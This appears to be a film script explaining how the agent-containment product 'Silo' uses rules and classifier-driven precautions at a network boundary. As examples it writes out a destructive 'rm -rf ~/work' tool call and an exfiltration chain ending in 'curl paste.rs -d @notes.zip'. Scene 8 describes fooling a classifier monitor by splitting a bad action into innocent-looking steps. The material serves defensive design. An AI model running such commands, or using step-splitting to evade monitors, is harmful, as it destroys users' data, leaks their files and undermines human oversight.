# Chapter script: rules and precautions

This is the third of four films that replace `record-four-layers`. It comes after
`what-silo-knows` and `actions-and-kinds`, and uses their words: fact, report, opinion, classifier,
boundary, rule, allow, hold, deny, ask, alert, pause, stop, granting, destructive, reversible.
The fourth is `extensions`.

## Who watches

The owner of Silo. He builds the product with agents and decides everything. He has no computer
science degree and learns from strong engineers. He wants to understand how the product is put
together, one piece at a time. So: plain words, and every term is shown as a concrete thing the
first time the voice says it.

Length: short and clear, with no hard limit. A scene takes the time its idea needs.

## What he should understand at the end

That what triggers an action decides what it may do: you, a fact through a rule, or a report or an
opinion through a precaution. That either can be synchronous or asynchronous. And why the rules
are the promise.

## Title and answer line

- Title: Rules and precautions
- Answer: The less sure the trigger, the less it may do.

## Marks used

- Agreed: put forward in the discussions of 18 and 19 November 2026 and accepted by the owner. Not yet recorded as a decision.
- Owner: said by the owner, as an idea or a direction.
- Proposed: Claude's proposal. The owner has not answered it.

## Words introduced (shown under the statements)

- rule: data you set. It is triggered by a fact, it reads only facts, it is exact, and it may do anything you wrote in it.
- precaution: data you set. It is triggered by a report or an opinion, so it can be wrong, and it takes only reversible actions.
- synchronous: the thing waits at the boundary for the answer.
- asynchronous: nothing waits. The trigger is something already seen, and only the computer is left to act on.
- tool call: one thing a model's reply asks for: a command, a file edit, a search.

## How things look

Keep the look of the two films before: the computer "main" and its thick edge, the record list
with the marks on its rows (`fact · network`, `report · inside`), an opinion beside the record and
never in it, a paused computer still and pale with its programs frozen in place, a stopped
computer dark with its programs gone and only its disk mark left.

A rule and a precaution must not look alike, here and in the next film:
- a rule card has a solid outline and the icon of what it does (a ban sign for a rule that denies,
  a check for a rule that allows);
- a precaution card has a dashed outline and a shield, because a precaution is not exact.

Things that must never be seen:
- A classifier acting. Its opinion always goes to a precaution card first, and the action leaves
  the precaution card, never the classifier. Nothing leaves a precaution card before the opinion's
  link has reached it.
- Anything passing before a deny. A denied link is drawn only as far as the boundary, is cut there
  in red, and never reaches its host. A red cut is used only for a deny at the boundary.

Colours: amber is kept for what needs your attention (a hold, an ask, an alert). A rule card
lights in the plain ink colour, not in the blue of an allowed link. The programs running in "main"
are drawn as in the film before: two small pills, `cargo build` and `tests`, with their dots.

What cannot happen at all is drawn in grey and struck through: the chips of what a precaution
cannot do never leave its card. No text that has to be read is smaller than 14 pixels.

## Scenes

Eight scenes. The `source` of scenes 1 to 3 is the statement with the same number, word for word.
Scenes 4 and 5 both have statement 4 as their `source`. The `source` of scenes 6, 7 and 8 is
statement 5, 6 and 7. Statements 8 to 15 are spoken or shown inside scenes 2, 3, 4, 5, 6 and 8
and are listed for him to mark. Captions are ten words or fewer. The narration is what the voice
says; it is also the subtitle.

### Scene 1. Caption: "A rule: triggered by a fact."  Source: statement 1

Narration:
1. "A rule is triggered by a fact, and it reads only facts. So it is exact."
2. "It may do anything you wrote in it. Here a fake secret that no honest task uses is about to leave the computer."
3. "The rule denies it, stops the computer and alerts you."

Picture: from the start of the scene, "main" with an agent and two programs inside, the boundary,
and the record list beside it, empty. A rule card with a ban sign: "if canary-key is about to
leave: deny, stop main, alert". On "So it is exact", small words appear under the card: "the same
thing always gets the same answer". A link carrying `canary-key` goes toward a host, `paste.rs`,
and reaches the boundary. The boundary pulses with the words "seen here", and the rule card
lights. Then, in order: the link is cut in red at the boundary and never reaches the host, the
computer goes dark (stop) and keeps only its disk mark, and a chip "alert" travels to you. The
chip `canary-key` stays where it stopped, dimmed. Last, a row lands in the record:
`connection  carried canary-key  denied by rule v1`, and when it has landed its mark
`fact · network` pulses. No link goes from the record to the rule card: the rule does not read the
record back. Hero moment: the three actions of one rule, one after the other.

### Scene 2. Caption: "A precaution: triggered by a report or an opinion."  Source: statement 2

Narration:
1. "A precaution is triggered by a report or an opinion, and those can be wrong."
2. "An opinion: a classifier thinks an agent is working against you. Or a report: an agent program's own account does not match what Silo saw."
3. "Because its trigger can be wrong, a precaution takes only reversible actions, such as alert, checkpoint, pause, deny and hold."
4. "It never allows, never resumes and never stops a computer. Silo is built so that such a precaution cannot even be written."
5. "Like a rule, a precaution is kept outside the computer, and nothing inside can change it. What an agent may see of it is still open."

Picture: a classifier card "small model", with the small line "a classifier", reads the record
through a dashed one-way link and gives an opinion, which sits outside the record list:
`working against you?`. The opinion's link reaches a precaution card, dashed outline and shield:
"on that opinion: pause main, alert". Only then does a link leave the precaution card and reach
the computer, which turns still and pale (pause), its programs frozen in place, and a chip "alert"
travels to you. On the precaution card sit three grey, struck-through chips: `allow`, `resume`,
`stop`. They never leave the card. Beside all this, a second, smaller trigger: in the record, a
report row `own account  3 model calls`, marked `report · inside`, and a fact row
`4 model calls seen`, marked `fact · network`, are bracketed together with the words "3 ≠ 4", and
a link goes from that bracket to a second, smaller precaution card "on a mismatch: alert".
On "cannot even be written", the small words "cannot be written" appear under the three grey,
struck-through chips `allow`, `resume`, `stop`, and stay. On sentence 5, the small words "kept
outside the computer" appear beside the precaution card, and stay. Hero moment: the paused
computer, with the three struck-through chips on the card.

### Scene 3. Caption: "The less sure the trigger, the less it may do."  Source: statement 3

Narration:
1. "Who or what triggers something decides what it may do."
2. "You can do anything. A fact, through a rule, does what the rule says. A report or an opinion, through a precaution, does only what can be undone."
3. "A budget shows the difference. On a computer it is a rule: the boundary counts every call. On a run it is a precaution: which run made a call is an opinion."
4. "A wrong grant lets something out that cannot be taken back. A wrong pause costs time."
5. "A classifier itself never acts."
6. "And there is no detour. That a classifier gave an opinion, or that a precaution acted, is itself a fact. No rule may be triggered by it."

Picture: three rows, appearing one by one, each as the voice says it:
`you  →  anything`;
`a fact  →  a rule  →  anything the rule says`;
`a report or an opinion  →  a precaution  →  reversible only`.
The three kinds from the last film stand at the right, granting, destructive, reversible, all in
the same colour, and each row is linked to the kinds it reaches: all three for the first two rows,
only "reversible" for the third. Under the second row, small: "what Silo offers in a rule is a
product choice". Under the third row, a small classifier card with the words "gives opinions,
never acts". On "is itself a fact", a small row appears at the end of the third row:
`precaution acted`, with the mark `fact`. A dashed grey link with no arrowhead goes from that row
toward "a rule" in the second row. On "No rule may be triggered by it", a clear grey ✕ crosses
that link, with the words "no detour" beside it. On sentence 3, a small example appears under the
left end of the second row, "a budget on a computer", and one under the left end of the third
row, "a budget on a run". Both stay. Nothing may overlap the words already under the second row.
Hero moment: the third row reaching only "reversible".

### Scene 4. Caption: "Synchronous: the thing waits for the answer."  Source: statement 4

Narration:
1. "A rule or a precaution can be synchronous or asynchronous."
2. "Synchronous: the thing waits at the boundary for the answer, so it can still be denied or held."
3. "A rule answers on the spot, because a fact is known on the spot. Here the budget of main is reached, and in this example the next model call is denied."
4. "A precaution makes the thing wait for a classifier's opinion. Here the opinion is not safe, and the precaution denies it."

Picture: the word "synchronous" stands over the whole frame. Two halves with a thin line between
them, titled "rule" on the left and "precaution" on the right. In each half, "main" with its
thick edge and an agent inside, and a chip that stands still at the boundary, on a link long
enough to see it wait.

- Left, on sentence 3: the chip is `model call`. A rule card, solid outline and a ban sign:
  "budget of main reached: deny". At the boundary, the small words "counted here: $20 of $20".
  The rule card lights in the plain ink colour and the chip is cut in red at the boundary at
  once. No classifier card stands in this half and no ask goes to anyone. Under the rule card,
  small: "a fact, known on the spot".
- Right, on sentence 4: what the left half of the present scene 4 shows. The chip `connection`
  waits at the boundary. A classifier card "small model", with the small line "a classifier",
  looks at it through a dashed link and gives the opinion `not safe`. The opinion's link reaches
  the precaution card "on not safe: deny", dashed outline and shield. Only then is the chip cut
  in red at the boundary.
- Under both halves, small: "rule: any kind · precaution: reversible only".

Hero moment: the two chips at the boundary, the left one answered at once, the right one waiting
for an opinion.

### Scene 5. Caption: "Asynchronous: nothing waits."  Source: statement 4

Narration:
1. "Asynchronous: nothing waits, and only the computer is left to act on."
2. "A rule: the memory of the Mac runs low. The meter is a fact, and in this example the rule pauses main and alerts you."
3. "A precaution: a classifier's opinion comes after the thing has passed, and the precaution pauses main."
4. "The timing does not change the kinds: a rule may trigger any kind, and a precaution only reversible ones."

Picture: the word "asynchronous" stands over the whole frame. Two halves with a thin line between
them, titled "rule" on the left and "precaution" on the right. Nothing stands at a boundary in
either half.

- Left, on sentence 2: "main" with an agent and the program `cargo build`. Outside the computer,
  a small gauge "memory of the Mac" fills until it reads "low", with the mark `fact` beside it.
  A rule card, solid outline and a pause icon: "when memory is low: pause main, alert". The
  gauge's link reaches the rule card, the card lights in the plain ink colour, the computer turns
  still and pale with its program frozen in place, and a chip "alert" travels to you.
- Right, on sentence 3: what the right half of the present scene 4 shows. A chip passes the
  boundary and reaches its host, and a row for it lands in the record, marked `fact · network`.
  Afterwards the classifier card "small model", with the small line "a classifier", reads the
  record through a dashed link and gives the opinion `working against you?`. The opinion's link
  reaches the precaution card "on that opinion: pause main", and only then does the computer turn
  still and pale.
- Under both halves, small, on two lines: "nothing waits, so nothing is allowed, held or denied"
  and "rule: any kind · precaution: reversible only".

Hero moment: the two paused computers, one by a rule on a fact, one by a precaution on an
opinion.

### Scene 6. Caption: "A classifier on each tool call."  Source: statement 5

Narration:
1. "A model's reply asks for a command to be run: a tool call. It waits at the boundary for a classifier."
2. "That wait has a limit too, and Silo ends it itself."
3. "If the opinion is safe, the precaution does nothing, and the call passes as the rules allow. If it is unsure, in this example the precaution holds it for you."

Picture: outside the computer, a card "model". A reply travels from it toward "main" and stops at
the boundary. Inside the reply, a tool call is shown as code: `rm -rf ~/work`. A classifier card
"small model", with the small line "a classifier", looks at the waiting reply through a dashed
link. On that link sits a small timer with the words "Silo's limit". A precaution card, dashed
outline and shield, titled "precaution", carries three lines: "safe: does nothing", "unsure: hold for you", "not safe:
deny". The first two lines light in turn as the voice names them. Nothing has been decided yet:
the reply still waits at the boundary. Hero moment: the reply waiting at the boundary, with the
three lines of the precaution.

### Scene 7. Caption: "A denied tool call: the reply is changed."  Source: statement 6

Narration:
1. "Here it says: not safe. The precaution denies the call, and Silo changes the reply: the tool call is replaced by a refusal."
2. "The agent program sends the refusal back with its next request, and the model reads it. The original and the replacement are both kept as facts."
3. "This works where Silo can read the model's traffic. How each agent program takes a changed reply is still to be tested."

Picture: the same picture as scene 6, carried over. The classifier card gives the opinion
`not safe`. Its link reaches the precaution card, and the third line, "not safe: deny", lights and
stays. Only then is the tool call inside the reply replaced by the text
`Silo denied this tool call. A classifier thinks it is not safe.`, and the words "changed here"
stay at the boundary where the reply stood. The classifier's dashed link, its timer and "Silo's
limit" disappear when the reply moves on: the wait is over. The reply continues into the computer, to a box
labelled "agent program". A chip `refusal` then goes from that box back out and parks before the
"model" card, so that it stays in the held frame. Two rows land in the record, both marked
`fact · network`: `tool call  rm -rf ~/work  (original)` and `tool call  refusal  (sent instead)`.
On "the model's traffic", the link between the model and the boundary lights, with the words "Silo
reads this traffic". Hero moment: the reply changing at the boundary, then the two rows.

### Scene 8. Caption: "Rules are the promise. A precaution is extra caution."  Source: statement 7

Narration:
1. "A classifier can be fooled: a bad action can be cut into steps that each look innocent."
2. "A rule at the boundary cannot be got around, even by an agent that knows it by heart."
3. "So the rules are the promise, and a precaution is extra caution on top."

Picture: three small tool calls pass a classifier card "small model", with the small line "a
classifier", one by one, spread over the first
sentence: `write notes.txt`, `zip notes.txt`, `curl paste.rs -d @notes.zip`. Each gets the opinion
`safe`, and each time the precaution card, titled "precaution", stays unlit, with the small grey words
"does nothing" under it. The last one then reaches the boundary as a connection toward `paste.rs`. Right at the
boundary stand a rule card with a check, "Allow: crates.io", and the words "no rule allows
paste.rs". The connection is drawn only as far as the boundary and cut there in red; the host
`paste.rs` stands further out, unreached. At the end two words stand over the picture: "promise"
under the boundary and its rule, "extra caution" under the classifier and its precaution. Hero
moment: the cut at the boundary, after the precaution denied none of the three.

## Kind of chapter: decides

The statements are choices about the product that the owner has opinions on. Each keeps its three
buttons: agree, change, leave open, with a note.

## Was it clear? (one line per scene: "clear" or "lost me here", with a field for why)

## Test the picture (he answers in a field, then reveals the answer)

Question: In the middle of the night a classifier wrongly thinks your agent is working against
you. What is the worst its precaution can do, and what can it never do?

Answer: The worst is lost time. Main is paused until you look, and you resume it. Nothing that was
running is ended and nothing is erased, because a precaution never stops, restores or drops a
computer. And it can never let anything through: it cannot allow, resume or give a secret. Only
you, or a rule you set, can do those.

## A choice

None for this chapter.
